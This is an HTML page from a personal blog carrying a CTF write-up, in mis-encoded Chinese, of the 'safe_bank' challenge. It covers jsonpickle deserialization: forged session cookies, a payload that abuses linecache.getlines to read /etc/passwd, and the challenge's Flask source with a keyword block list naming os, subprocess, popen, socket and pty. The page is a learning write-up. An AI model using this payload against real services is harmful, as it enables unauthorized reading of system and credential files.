<!doctype html>
<html lang="en-US">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="generator" content="VuePress 2.0.0-rc.20" />
    <style>
      :root {
        --vp-c-bg: #fff;
      }

      [data-theme='dark'] {
        --vp-c-bg: #1b1b1f;
      }

      html,
      body {
        background-color: var(--vp-c-bg);
      }
    </style>
    <script>
      const useChoice = localStorage.getItem('vuepress-color-scheme')
      const systemStatus =
        'matchMedia' in window
          ? window.matchMedia('(prefers-color-scheme: dark)').matches
          : false

      if (useChoice === 'light') {
        document.documentElement.dataset.theme = 'light'
      } else if (useChoice === 'dark' || systemStatus) {
        document.documentElement.dataset.theme = 'dark'
      }
    </script>
    <title>safe_bank | Songsanggggg's Home</title><meta name="description" content="Songsanggggg's Blog Site">
    <link rel="preload" href="/assets/style-CZlZBiRp.css" as="style"><link rel="stylesheet" href="/assets/style-CZlZBiRp.css">
    <link rel="modulepreload" href="/assets/app-C2I5gSR0.js"><link rel="modulepreload" href="/assets/SafeBank.html-CxY3Xwhw.js">
    <link rel="prefetch" href="/assets/index.html-BZ5k9iZA.js" as="script"><link rel="prefetch" href="/assets/Celerace.html-BRtiq2Sx.js" as="script"><link rel="prefetch" href="/assets/RBAC.html-BHj8wkyZ.js" as="script"><link rel="prefetch" href="/assets/SelfIntroduction.html-Dhp5FjgH.js" as="script"><link rel="prefetch" href="/assets/Smallcode.html-DYxy2t-n.js" as="script"><link rel="prefetch" href="/assets/èƒ¶ç‰‡é¢„è§ˆ.html-C38OyNQB.js" as="script"><link rel="prefetch" href="/assets/404.html-CeWR_Bvo.js" as="script"><link rel="prefetch" href="/assets/index.html-Be-xO_Ma.js" as="script"><link rel="prefetch" href="/assets/index.html-CZFEkRu5.js" as="script"><link rel="prefetch" href="/assets/index.html-41gOjXbq.js" as="script"><link rel="prefetch" href="/assets/index.html-BXUmV-R2.js" as="script"><link rel="prefetch" href="/assets/index.html-B7YatMRT.js" as="script"><link rel="prefetch" href="/assets/index.html-DxUDMcfG.js" as="script"><link rel="prefetch" href="/assets/index.html-DGcfMQQF.js" as="script"><link rel="prefetch" href="/assets/index.html-Dunb2QaA.js" as="script"><link rel="prefetch" href="/assets/index.html-48QUPJ1a.js" as="script"><link rel="prefetch" href="/assets/index.html-BZvTmejS.js" as="script"><link rel="prefetch" href="/assets/index.html-LwD7iIqn.js" as="script"><link rel="prefetch" href="/assets/index.html-Dnbx9TEO.js" as="script"><link rel="prefetch" href="/assets/index.html-A5GszBwG.js" as="script"><link rel="prefetch" href="/assets/index.html-BAhLMrqd.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><div class="vp-theme-container external-link-icon" vp-container><!--[--><header class="vp-navbar" vp-navbar><div class="vp-toggle-sidebar-button" title="toggle sidebar" aria-expanded="false" role="button" tabindex="0"><div class="icon" aria-hidden="true"><span></span><span></span><span></span></div></div><span><a class="route-link" href="/"><img class="vp-site-logo" src="https://avatars.githubusercontent.com/u/95994511" alt="Songsanggggg&#39;s Home"><span class="vp-site-name vp-hide-mobile" aria-hidden="true">Songsanggggg&#39;s Home</span></a></span><div class="vp-navbar-items-wrapper" style=""><!--[--><!--]--><nav class="vp-navbar-items vp-hide-mobile" aria-label="site navigation"><!--[--><div class="vp-navbar-item"><a class="route-link auto-link" href="/" aria-label="Home"><!--[--><!--[--><!--]--><!--]-->Home<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/article/" aria-label="Article"><!--[--><!--[--><!--]--><!--]-->Article<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/category/" aria-label="Category"><!--[--><!--[--><!--]--><!--]-->Category<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/tag/" aria-label="Tag"><!--[--><!--[--><!--]--><!--]-->Tag<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/timeline/" aria-label="Timeline"><!--[--><!--[--><!--]--><!--]-->Timeline<!--[--><!--[--><!--]--><!--]--></a></div><!--]--></nav><!--[--><!--]--><button type="button" class="vp-toggle-color-mode-button" title="toggle color mode"><svg class="light-icon" viewbox="0 0 32 32" style=""><path d="M16 12.005a4 4 0 1 1-4 4a4.005 4.005 0 0 1 4-4m0-2a6 6 0 1 0 6 6a6 6 0 0 0-6-6z" fill="currentColor"></path><path d="M5.394 6.813l1.414-1.415l3.506 3.506L8.9 10.318z" fill="currentColor"></path><path d="M2 15.005h5v2H2z" fill="currentColor"></path><path d="M5.394 25.197L8.9 21.691l1.414 1.415l-3.506 3.505z" fill="currentColor"></path><path d="M15 25.005h2v5h-2z" fill="currentColor"></path><path d="M21.687 23.106l1.414-1.415l3.506 3.506l-1.414 1.414z" fill="currentColor"></path><path d="M25 15.005h5v2h-5z" fill="currentColor"></path><path d="M21.687 8.904l3.506-3.506l1.414 1.415l-3.506 3.505z" fill="currentColor"></path><path d="M15 2.005h2v5h-2z" fill="currentColor"></path></svg><svg class="dark-icon" viewbox="0 0 32 32" style="display:none;"><path d="M13.502 5.414a15.075 15.075 0 0 0 11.594 18.194a11.113 11.113 0 0 1-7.975 3.39c-.138 0-.278.005-.418 0a11.094 11.094 0 0 1-3.2-21.584M14.98 3a1.002 1.002 0 0 0-.175.016a13.096 13.096 0 0 0 1.825 25.981c.164.006.328 0 .49 0a13.072 13.072 0 0 0 10.703-5.555a1.01 1.01 0 0 0-.783-1.565A13.08 13.08 0 0 1 15.89 4.38A1.015 1.015 0 0 0 14.98 3z" fill="currentColor"></path></svg></button><!----></div></header><!--]--><div class="vp-sidebar-mask"></div><!--[--><aside class="vp-sidebar" vp-sidebar><nav class="vp-navbar-items" aria-label="site navigation"><!--[--><div class="vp-navbar-item"><a class="route-link auto-link" href="/" aria-label="Home"><!--[--><!--[--><!--]--><!--]-->Home<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/article/" aria-label="Article"><!--[--><!--[--><!--]--><!--]-->Article<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/category/" aria-label="Category"><!--[--><!--[--><!--]--><!--]-->Category<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/tag/" aria-label="Tag"><!--[--><!--[--><!--]--><!--]-->Tag<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/timeline/" aria-label="Timeline"><!--[--><!--[--><!--]--><!--]-->Timeline<!--[--><!--[--><!--]--><!--]--></a></div><!--]--></nav><!--[--><!--]--><ul class="vp-sidebar-items"><!--[--><li><p tabindex="0" class="vp-sidebar-item vp-sidebar-heading">safe_bank <!----></p><!----></li><!--]--></ul><!--[--><!--]--></aside><!--]--><!--[--><main class="vp-page"><!--[--><!--]--><div vp-content><!--[--><!--]--><div><h1 id="safe-bank" tabindex="-1"><a class="header-anchor" href="#safe-bank"><span>safe_bank</span></a></h1><p>â€‹ æœ¬é¢˜æ˜¯åœ¨Nepctfä¸­é‡åˆ°äº†ä¸€é“é¢˜ï¼Œæ˜¯æ¥è§¦CTFä¸ä¹…çš„ä¸€æ¬¡æ¯”èµ›ï¼Œæ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦jsonpickleååºåˆ—åŒ–ï¼Œå…¶ä¸­clearçš„æ€è·¯æ¥è‡ªPid,å±äºéé¢„æœŸè§£ï¼Œä½†æ˜¯æ˜¯çœŸä¸å¥½æƒ³å•ŠğŸ˜­ã€‚</p><p>â€‹ é¢˜ç›®ä¸­æè¿°å¦‚ä¸‹ï¼š</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code><span class="line">Python Flaskä½œä¸ºWebæ¡†æ¶</span>
<span class="line">JSONç”¨äºæ•°æ®äº¤æ¢</span>
<span class="line">ä½¿ç”¨jsonpickleçš„é«˜çº§ä¼šè¯ç®¡ç†</span>
<span class="line">Base64ç¼–ç ç”¨äºTokenä¼ è¾“</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹ æˆ‘ä»¬éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·æ‹¿åˆ°cookieå¦‚ä¸‹</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json"><pre><code><span class="line">eyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogIjEyMzQiLCAidHMiOiAxNzUzNzkyODQzfX0=</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;__main__.Session&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;meta&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;user&quot;</span><span class="token operator">:</span> <span class="token string">&quot;1234&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;ts&quot;</span><span class="token operator">:</span> <span class="token number">1753792843</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹ ç¡®è®¤æ–¹å‘ä¸ºjsonpickleååºåˆ—åŒ–</p><p>â€‹ æˆ‘ä»¬ä¿®æ”¹userçš„å€¼</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json"><pre><code><span class="line"><span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;__main__.Session&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;meta&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;user&quot;</span><span class="token operator">:</span> <span class="token string">&quot;114514&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;ts&quot;</span><span class="token operator">:</span> <span class="token number">1753792843</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">eyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogIjExNDUxNCIsICJ0cyI6IDE3NTM3OTI4NDN9fQ==</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹ æ­¤æ—¶é¡µé¢ç”¨æˆ·åä¹Ÿç›¸åº”å˜æˆäº†114514ï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨114514å›æ˜¾ã€‚</p><table><thead><tr><th style="text-align:center;"><strong>æ ‡ç­¾</strong></th><th style="text-align:center;"><strong>åŠŸèƒ½</strong></th><th style="text-align:center;"><strong>ä½¿ç”¨åœºæ™¯</strong></th></tr></thead><tbody><tr><td style="text-align:center;"><code>py/object</code></td><td style="text-align:center;">æ ‡è¯†å®ä¾‹å¯¹è±¡çš„ç±»å‹è·¯å¾„</td><td style="text-align:center;">è‡ªå®šä¹‰ç±»å®ä¾‹é‡å»º</td></tr><tr><td style="text-align:center;"><code>py/type</code></td><td style="text-align:center;">æ ‡è¯†ç±»å‹å¯¹è±¡æœ¬èº«</td><td style="text-align:center;">åºåˆ—åŒ–ç±»å®šä¹‰</td></tr><tr><td style="text-align:center;"><code>py/state</code></td><td style="text-align:center;">å­˜å‚¨å¯¹è±¡å±æ€§çŠ¶æ€</td><td style="text-align:center;">åˆå§‹åŒ–å¯¹è±¡å±æ€§</td></tr><tr><td style="text-align:center;"><code>py/newargs</code></td><td style="text-align:center;">æŒ‡å®š <code>__new__</code> å‚æ•°</td><td style="text-align:center;">ä¸å¯å˜å¯¹è±¡åˆ›å»º</td></tr><tr><td style="text-align:center;"><code>py/ref</code> &amp; <code>py/id</code></td><td style="text-align:center;">å¤„ç†å¯¹è±¡å¼•ç”¨å’Œå”¯ä¸€æ ‡è¯†</td><td style="text-align:center;">å¾ªç¯å¼•ç”¨ä¼˜åŒ–</td></tr><tr><td style="text-align:center;"><code>py/reduce</code></td><td style="text-align:center;">æ‰§è¡Œå¯è°ƒç”¨å¯¹è±¡é‡å»º</td><td style="text-align:center;">å¤æ‚å¯¹è±¡è‡ªå®šä¹‰é‡å»º</td></tr><tr><td style="text-align:center;"><code>py/tuple</code></td><td style="text-align:center;">ä¿æŒå…ƒç»„ç±»å‹</td><td style="text-align:center;">åŒºåˆ†å…ƒç»„å’Œåˆ—è¡¨</td></tr><tr><td style="text-align:center;"><code>py/set</code></td><td style="text-align:center;">æ ‡è¯†é›†åˆç±»å‹</td><td style="text-align:center;">åºåˆ—åŒ–é›†åˆæ•°æ®ç»“æ„</td></tr></tbody></table><blockquote><p>Provided by Deepseek</p></blockquote><p>â€‹ åœ¨ä¸‹æ–¹æºç ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°<code>jsonpickle.decode(decoded, safe=True)</code>ï¼Œæ‰€ä»¥<code>py/reduce</code>æ— æ³•ä½¿ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>py/object</code>æ¥åˆ¶å®šæ–¹æ³•è°ƒç”¨ã€‚</p><p>â€‹ è¿™é“é¢˜ä¸­æœ‰å¾ˆå¤šè¿‡æ»¤ï¼Œå¤šæ¬¡å°è¯•ä¹‹åå‘ç°<code>linecache.getliounes()</code>æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬å°è¯•æ„å»ºå¦‚ä¸‹payloadï¼š</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json"><pre><code><span class="line"><span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span><span class="token string">&quot;__main__.Session&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;meta&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">&quot;user&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span><span class="token string">&quot;linecache.getlines&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;py/newargsex&quot;</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token property">&quot;py/set&quot;</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">&quot;/etc/passwd&quot;</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">&quot;ts&quot;</span><span class="token operator">:</span><span class="token number">1753532149</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>â€‹ æˆåŠŸæ˜¾ç¤º<code>/etc/passwd</code>æ–‡ä»¶å†…å®¹ï¼Œæ­¤æ—¶æˆ‘ä»¬å®ç°äº†ä»»æ„è¯»ï¼Œä½†æ˜¯ç”±äºæƒé™ä¸è¶³ï¼Œæ²¡æœ‰åŠæ³•è¯»å–/flagå†…å®¹ã€‚</p><p>â€‹ æˆ‘ä»¬è¯»å–<code>/proc/self/cmdline</code>å’Œ<code>/proc/self/pwd</code>è·å¾—å½“å‰å·¥ä½œè·¯å¾„ä¸º<code>/app</code>ï¼Œæ‰§è¡Œå‘½ä»¤ä¸º<code>python app.py</code>ï¼Œæ‹¼æ¥èµ·æ¥è·å–åˆ°æºç è·¯å¾„ï¼Œæˆ‘ä»¬è¯»å–æºç å¦‚ä¸‹ï¼š</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py"><pre><code><span class="line"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for</span>
<span class="line"><span class="token keyword">import</span> jsonpickle</span>
<span class="line"><span class="token keyword">import</span> base64</span>
<span class="line"><span class="token keyword">import</span> json</span>
<span class="line"><span class="token keyword">import</span> os</span>
<span class="line"><span class="token keyword">import</span> time</span>
<span class="line"></span>
<span class="line">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span></span>
<span class="line">app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">class</span> <span class="token class-name">Account</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> uid<span class="token punctuation">,</span> pwd<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        self<span class="token punctuation">.</span>uid <span class="token operator">=</span> uid</span>
<span class="line">        self<span class="token punctuation">.</span>pwd <span class="token operator">=</span> pwd</span>
<span class="line"></span>
<span class="line"><span class="token keyword">class</span> <span class="token class-name">Session</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> meta<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        self<span class="token punctuation">.</span>meta <span class="token operator">=</span> meta</span>
<span class="line"></span>
<span class="line">users_db <span class="token operator">=</span> <span class="token punctuation">[</span></span>
<span class="line">    Account<span class="token punctuation">(</span><span class="token string">&quot;admin&quot;</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span></span>
<span class="line">    Account<span class="token punctuation">(</span><span class="token string">&quot;guest&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;guest&quot;</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">]</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">register_user</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">for</span> acc <span class="token keyword">in</span> users_db<span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">if</span> acc<span class="token punctuation">.</span>uid <span class="token operator">==</span> username<span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> <span class="token boolean">False</span></span>
<span class="line">    users_db<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Account<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">return</span> <span class="token boolean">True</span></span>
<span class="line"></span>
<span class="line">FORBIDDEN <span class="token operator">=</span> <span class="token punctuation">[</span></span>
<span class="line">    <span class="token string">&#39;builtins&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;os&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;system&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;repr&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__class__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;subprocess&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;popen&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;Popen&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;nt&#39;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token string">&#39;code&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;reduce&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;compile&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;command&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;pty&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;platform&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;pdb&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;pickle&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;marshal&#39;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token string">&#39;socket&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;threading&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;multiprocessing&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;signal&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;traceback&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;inspect&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;\\\\&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;posix&#39;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token string">&#39;render_template&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;jsonpickle&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;cgi&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;execfile&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;importlib&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sys&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;shutil&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;state&#39;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token string">&#39;import&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;ctypes&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;timeit&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;input&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;open&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;codecs&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;base64&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;jinja2&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;re&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;json&#39;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token string">&#39;file&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;write&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;read&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;globals&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;locals&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;getattr&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;setattr&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;delattr&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;uuid&#39;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token string">&#39;__import__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__globals__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__code__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__closure__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__func__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__self&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;pydoc&#39;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token string">&#39;__module__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__dict__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__mro__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__subclasses__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__init__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__new__&#39;</span></span>
<span class="line"><span class="token punctuation">]</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">try</span><span class="token punctuation">:</span></span>
<span class="line">        data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>serialized<span class="token punctuation">)</span></span>
<span class="line">        payload <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">for</span> bad <span class="token keyword">in</span> FORBIDDEN<span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">if</span> bad <span class="token keyword">in</span> payload<span class="token punctuation">:</span></span>
<span class="line">                <span class="token keyword">return</span> bad</span>
<span class="line">        <span class="token keyword">return</span> <span class="token boolean">None</span></span>
<span class="line">    <span class="token keyword">except</span><span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> <span class="token string">&quot;error&quot;</span></span>
<span class="line"></span>
<span class="line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">root</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;index.html&#39;</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/register&#39;</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;POST&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">&#39;POST&#39;</span><span class="token punctuation">:</span></span>
<span class="line">        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;username&#39;</span><span class="token punctuation">)</span></span>
<span class="line">        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;password&#39;</span><span class="token punctuation">)</span></span>
<span class="line">        confirm_password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;confirm_password&#39;</span><span class="token punctuation">)</span></span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> <span class="token keyword">not</span> password <span class="token keyword">or</span> <span class="token keyword">not</span> confirm_password<span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;register.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;æ‰€æœ‰å­—æ®µéƒ½æ˜¯å¿…å¡«çš„ã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">if</span> password <span class="token operator">!=</span> confirm_password<span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;register.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;å¯†ç ä¸åŒ¹é…ã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;register.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;ç”¨æˆ·åè‡³å°‘éœ€è¦4ä¸ªå­—ç¬¦ï¼Œå¯†ç è‡³å°‘éœ€è¦6ä¸ªå­—ç¬¦ã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">if</span> register_user<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;index.html&#39;</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">&quot;æ³¨å†ŒæˆåŠŸï¼è¯·ç™»å½•ã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">else</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;register.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;ç”¨æˆ·åå·²å­˜åœ¨ã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    </span>
<span class="line">    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;register.html&#39;</span><span class="token punctuation">)</span></span>
<span class="line"></span>
